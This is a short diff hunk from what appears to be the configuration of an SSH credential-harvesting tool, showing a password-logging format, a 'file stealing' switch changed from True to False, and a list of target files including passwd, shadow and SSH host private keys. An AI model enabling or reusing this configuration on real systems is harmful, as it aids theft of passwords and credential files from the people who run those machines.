@@ -70,7 +70,7 @@ LOG_FMT        = '%s (%s)\\n'  # format is '<(ssh )user(@host)> (<password>)\n'
 
 # START OF FILE STEALING STUFF.
 
-FILE_STEAL = True  # if False then nothing below will apply.
+FILE_STEAL = False  # if False then nothing below will apply.
 
 # you can also specify paths. wildcards apply..
 INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host_*_key*',
